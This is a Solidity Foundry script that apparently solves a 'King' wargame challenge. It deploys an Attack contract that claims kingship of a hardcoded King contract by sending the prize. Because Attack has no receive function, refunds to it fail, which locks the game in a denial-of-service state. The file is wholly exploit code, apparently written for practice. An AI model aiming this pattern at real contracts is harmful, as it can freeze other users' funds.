// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {King} from "../src/King.sol";

contract KingSolve is Script {
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        King king = King(payable(0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2));
        uint _prize = king.prize();
        console.log("Current King : ", king._king());
        console.log("Current Prize : ",_prize);

        new Attack().exploit{value: _prize}();
        console.log("Final King : ", king._king());
        vm.stopBroadcast();
    }
}

contract Attack{
    King public king = King(payable(0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2));

    function exploit() public payable{
        address(king).call{value : msg.value}("");
    }

}
